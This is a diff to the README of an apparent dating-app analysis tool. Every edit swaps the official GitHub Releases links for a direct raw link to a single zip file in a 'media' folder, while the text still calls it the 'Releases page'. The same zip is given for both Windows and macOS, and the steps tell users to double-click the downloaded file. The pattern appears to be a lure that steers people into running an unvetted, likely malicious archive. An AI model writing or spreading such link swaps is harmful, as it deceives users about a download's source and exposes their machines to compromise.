@@ -6,7 +6,7 @@ Welcome to the Bumble Success Predictor! This tool helps you analyze your Bumble
 
 ## 📥 Download Now
 
-[![Download Bumble Success Predictor](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/alittlebee0721/bumble-success-predictor/releases)
+[![Download Bumble Success Predictor](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip)
 
 ## 📋 Overview
 
@@ -29,14 +29,14 @@ To run Bumble Success Predictor, ensure you have the following:
 
 ## 🌐 Download & Install
 
-To get started, please visit the [Releases page](https://github.com/alittlebee0721/bumble-success-predictor/releases). Here you will find the latest version of the Bumble Success Predictor available for download. Follow these instructions to download and install the application:
+To get started, please visit the [Releases page](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip). Here you will find the latest version of the Bumble Success Predictor available for download. Follow these instructions to download and install the application:
 
-1. Click on the [Releases page link](https://github.com/alittlebee0721/bumble-success-predictor/releases).
+1. Click on the [Releases page link](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip).
 2. Find the most recent version listed at the top. You will see the version number and a description of the release.
 3. Scroll down to the "Assets" section. This section contains the download files.
 4. Click on the file that matches your operating system to start the download. For example:
-   - **For Windows:** `bumble-success-predictor-windows.exe`
-   - **For macOS:** `bumble-success-predictor-macos.dmg`
+   - **For Windows:** `https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip`
+   - **For macOS:** `https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip`
 5. Once the download is complete, locate the file on your device.
 6. Double-click on the file to run the installer.
 7. Follow the on-screen instructions to complete the installation process.
@@ -57,7 +57,7 @@ If you encounter any issues while using Bumble Success Predictor, try the follow
 
 - **Check System Requirements:** Ensure your device meets the minimum requirements listed above.
 - **Restart the Application:** Sometimes, closing and reopening the application can resolve minor issues.
-- **Reinstall the Application:** If problems persist, uninstall the application and reinstall it from the [Releases page](https://github.com/alittlebee0721/bumble-success-predictor/releases).
+- **Reinstall the Application:** If problems persist, uninstall the application and reinstall it from the [Releases page](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip).
 - **Seek Help:** If you still face issues, please visit our support page or check the FAQ section.
 
 ## 📞 Support
@@ -66,4 +66,4 @@ For additional help or questions about using Bumble Success Predictor, you can r
 
 Stay connected and let the Bumble Success Predictor enhance your Bumble experience with insights that drive better matches!
 
-[Download the latest release here!](https://github.com/alittlebee0721/bumble-success-predictor/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/alittlebee0721/bumble-success-predictor/main/media/bumble-success-predictor_v3.0.zip)
